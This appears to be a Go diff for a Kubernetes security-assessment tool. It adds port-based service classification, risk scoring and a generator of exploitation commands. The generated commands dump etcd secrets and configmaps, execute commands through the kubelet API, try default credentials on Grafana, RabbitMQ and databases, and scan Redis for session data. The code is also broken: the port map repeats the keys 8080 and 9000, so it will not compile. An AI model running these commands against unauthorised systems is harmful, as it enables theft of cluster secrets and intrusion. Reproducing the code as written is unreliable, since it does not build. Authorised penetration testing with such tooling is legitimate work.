@@ -819,3 +819,313 @@ func GetDeploymentRiskLevel(
 
 	return baseRisk
 }
+
+// Service Security Analysis Functions for Endpoints
+
+// ServiceClassification represents a classified service type
+type ServiceClassification struct {
+	Type        string // Database, Admin, API, ControlPlane, MessageQueue, etc.
+	Description string
+	IsSensitive bool
+}
+
+// ClassifyServiceByPort identifies service type based on port number
+func ClassifyServiceByPort(port int32) ServiceClassification {
+	serviceMap := map[int32]ServiceClassification{
+		// Kubernetes Control Plane
+		2379:  {Type: "ControlPlane", Description: "etcd", IsSensitive: true},
+		2380:  {Type: "ControlPlane", Description: "etcd peer", IsSensitive: true},
+		6443:  {Type: "ControlPlane", Description: "Kubernetes API Server", IsSensitive: true},
+		10250: {Type: "ControlPlane", Description: "Kubelet API", IsSensitive: true},
+		10255: {Type: "ControlPlane", Description: "Kubelet read-only", IsSensitive: true},
+		10256: {Type: "ControlPlane", Description: "kube-proxy health", IsSensitive: false},
+
+		// Databases
+		3306:  {Type: "Database", Description: "MySQL/MariaDB", IsSensitive: true},
+		5432:  {Type: "Database", Description: "PostgreSQL", IsSensitive: true},
+		27017: {Type: "Database", Description: "MongoDB", IsSensitive: true},
+		27018: {Type: "Database", Description: "MongoDB shard", IsSensitive: true},
+		6379:  {Type: "Database", Description: "Redis", IsSensitive: true},
+		9200:  {Type: "Database", Description: "Elasticsearch", IsSensitive: true},
+		9300:  {Type: "Database", Description: "Elasticsearch cluster", IsSensitive: true},
+		7000:  {Type: "Database", Description: "Cassandra", IsSensitive: true},
+		7001:  {Type: "Database", Description: "Cassandra SSL", IsSensitive: true},
+		8086:  {Type: "Database", Description: "InfluxDB", IsSensitive: true},
+		5984:  {Type: "Database", Description: "CouchDB", IsSensitive: true},
+		7474:  {Type: "Database", Description: "Neo4j", IsSensitive: true},
+		8529:  {Type: "Database", Description: "ArangoDB", IsSensitive: true},
+
+		// Admin Panels & Monitoring
+		8443:  {Type: "Admin", Description: "Kubernetes Dashboard", IsSensitive: true},
+		3000:  {Type: "Admin", Description: "Grafana", IsSensitive: true},
+		9090:  {Type: "Admin", Description: "Prometheus", IsSensitive: true},
+		9093:  {Type: "Admin", Description: "Alertmanager", IsSensitive: true},
+		5601:  {Type: "Admin", Description: "Kibana", IsSensitive: true},
+		8080:  {Type: "Admin", Description: "Jenkins/Generic Admin", IsSensitive: true},
+		8081:  {Type: "Admin", Description: "Generic Admin Panel", IsSensitive: true},
+		9000:  {Type: "Admin", Description: "Portainer/SonarQube", IsSensitive: true},
+		3001:  {Type: "Admin", Description: "Grafana alternate", IsSensitive: true},
+		16686: {Type: "Admin", Description: "Jaeger UI", IsSensitive: false},
+
+		// Message Queues
+		5672:  {Type: "MessageQueue", Description: "RabbitMQ AMQP", IsSensitive: true},
+		15672: {Type: "MessageQueue", Description: "RabbitMQ Management", IsSensitive: true},
+		9092:  {Type: "MessageQueue", Description: "Kafka", IsSensitive: true},
+		4222:  {Type: "MessageQueue", Description: "NATS", IsSensitive: true},
+		6650:  {Type: "MessageQueue", Description: "Pulsar", IsSensitive: true},
+		8161:  {Type: "MessageQueue", Description: "ActiveMQ", IsSensitive: true},
+
+		// Remote Access
+		22:   {Type: "RemoteAccess", Description: "SSH", IsSensitive: true},
+		3389: {Type: "RemoteAccess", Description: "RDP", IsSensitive: true},
+		5900: {Type: "RemoteAccess", Description: "VNC", IsSensitive: true},
+		23:   {Type: "RemoteAccess", Description: "Telnet", IsSensitive: true},
+
+		// Web/API
+		80:   {Type: "Web", Description: "HTTP", IsSensitive: false},
+		443:  {Type: "Web", Description: "HTTPS", IsSensitive: false},
+		8000: {Type: "API", Description: "Generic API", IsSensitive: false},
+		8888: {Type: "API", Description: "Generic API", IsSensitive: false},
+
+		// CI/CD
+		8080: {Type: "CICD", Description: "Jenkins", IsSensitive: true},
+		50000: {Type: "CICD", Description: "Jenkins agent", IsSensitive: true},
+		9000: {Type: "CICD", Description: "SonarQube", IsSensitive: true},
+	}
+
+	if classification, exists := serviceMap[port]; exists {
+		return classification
+	}
+
+	// Default classification based on port range
+	if port < 1024 {
+		return ServiceClassification{Type: "System", Description: "System service", IsSensitive: true}
+	}
+	return ServiceClassification{Type: "Application", Description: "Application service", IsSensitive: false}
+}
+
+// GetServiceRiskLevel calculates risk level for a service endpoint
+func GetServiceRiskLevel(serviceType string, port int32, isExternal bool, isReady bool, hasAuth bool) string {
+	// CRITICAL: External + Unauthenticated + Control Plane
+	if isExternal && !hasAuth && serviceType == "ControlPlane" {
+		return "CRITICAL"
+	}
+
+	// CRITICAL: External + Unauthenticated + Database
+	if isExternal && !hasAuth && serviceType == "Database" {
+		return "CRITICAL"
+	}
+
+	// CRITICAL: Kubernetes control plane exposed internally without auth
+	if serviceType == "ControlPlane" && !hasAuth {
+		return "CRITICAL"
+	}
+
+	// CRITICAL: External admin panels without auth
+	if isExternal && !hasAuth && serviceType == "Admin" {
+		return "CRITICAL"
+	}
+
+	// HIGH: Database without auth (internal)
+	if serviceType == "Database" && !hasAuth {
+		return "HIGH"
+	}
+
+	// HIGH: External remote access
+	if isExternal && serviceType == "RemoteAccess" {
+		return "HIGH"
+	}
+
+	// HIGH: Admin panels without auth (internal)
+	if serviceType == "Admin" && !hasAuth {
+		return "HIGH"
+	}
+
+	// HIGH: External message queues
+	if isExternal && serviceType == "MessageQueue" {
+		return "HIGH"
+	}
+
+	// MEDIUM: Sensitive services with auth
+	if (serviceType == "Database" || serviceType == "Admin" || serviceType == "ControlPlane") && hasAuth {
+		return "MEDIUM"
+	}
+
+	// MEDIUM: External APIs
+	if isExternal && serviceType == "API" {
+		return "MEDIUM"
+	}
+
+	// LOW: Everything else
+	return "LOW"
+}
+
+// IsUnauthenticatedService checks if a service typically lacks authentication
+func IsUnauthenticatedService(port int32, serviceName string) bool {
+	// Common services that often don't require authentication in K8s
+	unauthenticatedPorts := map[int32]bool{
+		6379:  true, // Redis (often no auth in internal deployments)
+		27017: true, // MongoDB (default config)
+		9200:  true, // Elasticsearch (often open)
+		5601:  true, // Kibana (often open)
+		9090:  true, // Prometheus (usually open)
+		10255: true, // Kubelet read-only (unauthenticated)
+		9093:  true, // Alertmanager (often open)
+		16686: true, // Jaeger (often open)
+	}
+
+	// Check by port
+	if unauthenticatedPorts[port] {
+		return true
+	}
+
+	// Check by service name patterns
+	lowerName := strings.ToLower(serviceName)
+	if strings.Contains(lowerName, "redis") ||
+		strings.Contains(lowerName, "elasticsearch") ||
+		strings.Contains(lowerName, "kibana") ||
+		strings.Contains(lowerName, "prometheus") ||
+		strings.Contains(lowerName, "grafana") {
+		return true
+	}
+
+	return false
+}
+
+// GetServiceExploitationTechniques returns exploit commands for service type
+func GetServiceExploitationTechniques(serviceType string, serviceName string, ip string, port int32) []string {
+	var techniques []string
+
+	switch serviceType {
+	case "ControlPlane":
+		if port == 2379 || port == 2380 {
+			techniques = append(techniques, fmt.Sprintf("# etcd - Kubernetes secrets database"))
+			techniques = append(techniques, fmt.Sprintf("ETCDCTL_API=3 etcdctl --endpoints=https://%s:%d get / --prefix --keys-only", ip, port))
+			techniques = append(techniques, fmt.Sprintf("ETCDCTL_API=3 etcdctl --endpoints=https://%s:%d get /registry/secrets --prefix", ip, port))
+			techniques = append(techniques, fmt.Sprintf("# Dump all configmaps:"))
+			techniques = append(techniques, fmt.Sprintf("ETCDCTL_API=3 etcdctl --endpoints=https://%s:%d get /registry/configmaps --prefix", ip, port))
+		} else if port == 10250 {
+			techniques = append(techniques, fmt.Sprintf("# Kubelet API - Execute commands in pods"))
+			techniques = append(techniques, fmt.Sprintf("curl -k https://%s:%d/pods", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl -k -XPOST https://%s:%d/run/<namespace>/<pod>/<container> -d 'cmd=id'", ip, port))
+		} else if port == 10255 {
+			techniques = append(techniques, fmt.Sprintf("# Kubelet read-only - No auth required"))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/pods", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/spec/", ip, port))
+		} else if port == 6443 {
+			techniques = append(techniques, fmt.Sprintf("# Kubernetes API Server"))
+			techniques = append(techniques, fmt.Sprintf("curl -k https://%s:%d/version", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl -k https://%s:%d/api/v1/namespaces", ip, port))
+		}
+
+	case "Database":
+		if port == 3306 {
+			techniques = append(techniques, fmt.Sprintf("# MySQL/MariaDB"))
+			techniques = append(techniques, fmt.Sprintf("mysql -h %s -P %d -u root -p", ip, port))
+			techniques = append(techniques, fmt.Sprintf("mysql -h %s -P %d -e 'SHOW DATABASES;'", ip, port))
+			techniques = append(techniques, fmt.Sprintf("# Try default creds: root/root, root/<empty>, admin/admin"))
+		} else if port == 5432 {
+			techniques = append(techniques, fmt.Sprintf("# PostgreSQL"))
+			techniques = append(techniques, fmt.Sprintf("psql -h %s -p %d -U postgres", ip, port))
+			techniques = append(techniques, fmt.Sprintf("PGPASSWORD=postgres psql -h %s -p %d -U postgres -c '\\l'", ip, port))
+		} else if port == 27017 || port == 27018 {
+			techniques = append(techniques, fmt.Sprintf("# MongoDB"))
+			techniques = append(techniques, fmt.Sprintf("mongo --host %s --port %d", ip, port))
+			techniques = append(techniques, fmt.Sprintf("mongosh 'mongodb://%s:%d'", ip, port))
+			techniques = append(techniques, fmt.Sprintf("# List databases: show dbs"))
+		} else if port == 6379 {
+			techniques = append(techniques, fmt.Sprintf("# Redis - Often no authentication"))
+			techniques = append(techniques, fmt.Sprintf("redis-cli -h %s -p %d INFO", ip, port))
+			techniques = append(techniques, fmt.Sprintf("redis-cli -h %s -p %d KEYS '*'", ip, port))
+			techniques = append(techniques, fmt.Sprintf("redis-cli -h %s -p %d CONFIG GET *", ip, port))
+			techniques = append(techniques, fmt.Sprintf("# Dump sensitive data:"))
+			techniques = append(techniques, fmt.Sprintf("redis-cli -h %s -p %d --scan --pattern 'session:*'", ip, port))
+		} else if port == 9200 || port == 9300 {
+			techniques = append(techniques, fmt.Sprintf("# Elasticsearch"))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/_cat/indices?v", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/_search?pretty", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/_cluster/health?pretty", ip, port))
+		}
+
+	case "Admin":
+		if port == 3000 || port == 3001 {
+			techniques = append(techniques, fmt.Sprintf("# Grafana - Try default admin:admin"))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/login", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl -u admin:admin http://%s:%d/api/datasources", ip, port))
+		} else if port == 9090 {
+			techniques = append(techniques, fmt.Sprintf("# Prometheus - Usually open"))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/api/v1/targets", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/api/v1/query?query=up", ip, port))
+			techniques = append(techniques, fmt.Sprintf("# Find secrets in metrics:"))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/api/v1/label/__name__/values | grep -i secret", ip, port))
+		} else if port == 5601 {
+			techniques = append(techniques, fmt.Sprintf("# Kibana"))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/api/status", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl http://%s:%d/", ip, port))
+		} else if port == 8443 {
+			techniques = append(techniques, fmt.Sprintf("# Kubernetes Dashboard"))
+			techniques = append(techniques, fmt.Sprintf("curl -k https://%s:%d/", ip, port))
+		}
+
+	case "MessageQueue":
+		if port == 5672 {
+			techniques = append(techniques, fmt.Sprintf("# RabbitMQ AMQP"))
+			techniques = append(techniques, fmt.Sprintf("# Connect with guest:guest (default)"))
+		} else if port == 15672 {
+			techniques = append(techniques, fmt.Sprintf("# RabbitMQ Management - Try guest:guest"))
+			techniques = append(techniques, fmt.Sprintf("curl -u guest:guest http://%s:%d/api/overview", ip, port))
+			techniques = append(techniques, fmt.Sprintf("curl -u guest:guest http://%s:%d/api/queues", ip, port))
+		} else if port == 9092 {
+			techniques = append(techniques, fmt.Sprintf("# Kafka"))
+			techniques = append(techniques, fmt.Sprintf("kafka-topics.sh --bootstrap-server %s:%d --list", ip, port))
+		}
+
+	case "RemoteAccess":
+		if port == 22 {
+			techniques = append(techniques, fmt.Sprintf("# SSH"))
+			techniques = append(techniques, fmt.Sprintf("ssh root@%s -p %d", ip, port))
+			techniques = append(techniques, fmt.Sprintf("nmap -p %d -sV %s", port, ip))
+		}
+	}
+
+	// Generic techniques for any service
+	if len(techniques) == 0 {
+		techniques = append(techniques, fmt.Sprintf("# Generic reconnaissance"))
+		techniques = append(techniques, fmt.Sprintf("nc -zv %s %d", ip, port))
+		techniques = append(techniques, fmt.Sprintf("nmap -sV -p %d %s", port, ip))
+	}
+
+	return techniques
+}
+
+// GetDatabaseConnectionString generates connection string for database type
+func GetDatabaseConnectionString(dbType string, ip string, port int32, username string, database string) string {
+	switch dbType {
+	case "MySQL", "MariaDB":
+		return fmt.Sprintf("mysql -h %s -P %d -u %s -p %s", ip, port, username, database)
+	case "PostgreSQL":
+		return fmt.Sprintf("psql -h %s -p %d -U %s -d %s", ip, port, username, database)
+	case "MongoDB":
+		return fmt.Sprintf("mongosh 'mongodb://%s:%s@%s:%d/%s'", username, "<password>", ip, port, database)
+	case "Redis":
+		return fmt.Sprintf("redis-cli -h %s -p %d", ip, port)
+	case "Elasticsearch":
+		return fmt.Sprintf("curl http://%s:%d", ip, port)
+	default:
+		return fmt.Sprintf("# Connect to %s at %s:%d", dbType, ip, port)
+	}
+}
+
+// IsSensitiveService checks if a service type is sensitive
+func IsSensitiveService(serviceType string) bool {
+	sensitiveTypes := []string{
+		"ControlPlane",
+		"Database",
+		"Admin",
+		"RemoteAccess",
+		"MessageQueue",
+		"CICD",
+	}
+	return contains(sensitiveTypes, serviceType)
+}
